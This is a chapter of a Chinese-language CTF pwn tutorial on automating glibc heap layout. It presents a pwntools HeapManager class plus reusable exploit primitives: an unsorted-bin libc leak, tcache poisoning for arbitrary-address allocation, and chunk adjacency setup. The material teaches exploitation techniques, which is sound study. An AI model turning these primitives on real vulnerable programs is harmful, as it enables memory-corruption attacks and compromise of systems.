# 第 9 章 堆布局自动化技巧

> 复杂堆题的 exp 往往有几十次 malloc/free，手工规划容易出错。这一章介绍用脚本辅助堆布局的方法。

---

## 9.1 为什么需要自动化

一道复杂的堆题可能需要：

- 填充 tcache 到特定状态
- 制造 chunk 相邻/重叠
- 把 chunk 放到特定的 bin
- 泄露地址后重新布局

手工跟踪这些状态很容易乱。用脚本自动化能：

1. 记录每次操作后的堆状态
2. 自动计算需要的填充量
3. 复用常见的布局模式

## 9.2 封装堆操作函数

```python
class HeapManager:
    def __init__(self, p):
        self.p = p
        self.chunks = {}
        self.index = 0
    
    def add(self, size, data):
        idx = self.index
        self.index += 1
        self.p.sendlineafter(b'>> ', b'1')
        self.p.sendlineafter(b'Size: ', str(size).encode())
        self.p.sendafter(b'Data: ', data)
        self.chunks[idx] = {'size': size, 'data': data, 'freed': False}
        return idx
    
    def delete(self, idx):
        self.p.sendlineafter(b'>> ', b'2')
        self.p.sendlineafter(b'Index: ', str(idx).encode())
        self.chunks[idx]['freed'] = True
    
    def edit(self, idx, data):
        self.p.sendlineafter(b'>> ', b'3')
        self.p.sendlineafter(b'Index: ', str(idx).encode())
        self.p.sendafter(b'Data: ', data)
        self.chunks[idx]['data'] = data
    
    def show(self, idx):
        self.p.sendlineafter(b'>> ', b'4')
        self.p.sendlineafter(b'Index: ', str(idx).encode())
        return self.p.recvline()
    
    def fill_tcache(self, size, count=7):
        """填充 tcache 到指定数量"""
        idxs = []
        for _ in range(count):
            idx = self.add(size, b'A' * size)
            idxs.append(idx)
        for idx in idxs:
            self.delete(idx)
        return idxs
```

## 9.3 常见布局模式

### 模式一：泄露 libc（unsorted bin leak）

```python
def leak_libc(self, elf, libc):
    # 大块进 unsorted bin
    idx = self.add(0x500, b'A' * 8)
    guard = self.add(0x20, b'guard')   # 防止和 top chunk 合并
    self.delete(idx)
    data = self.show(idx)
    leak = u64(data.strip()[:6].ljust(8, b'\x00'))
    libc.address = leak - 0x1ebbe0
    return libc.address
```

### 模式二：tcache poisoning

```python
def tcache_poison(self, target_addr, size=0x30):
    idx = self.add(size - 0x10, b'B' * (size - 0x10))
    self.delete(idx)
    self.edit(idx, p64(target_addr))
    self.add(size - 0x10, b'X')        # 原 chunk
    victim = self.add(size - 0x10, b'Y')  # target_addr
    return victim
```

### 模式三：制造 chunk 相邻

```python
def make_adjacent(self, sizes):
    """连续分配，制造物理相邻的 chunk"""
    idxs = []
    for size in sizes:
        idxs.append(self.add(size, b'A' * size))
    return idxs
```

## 9.4 调试辅助

在 exp 里集成 gdb 断点：

```python
def debug(self, script=''):
    gdb.attach(self.p, '''
        b _int_malloc
        b _int_free
        ''' + script)
    pause()
```

打印堆状态：

```python
def dump_state(self):
    for idx, info in self.chunks.items():
        status = 'freed' if info['freed'] else 'used'
        print(f'chunk {idx}: size={hex(info["size"])} status={status}')
```
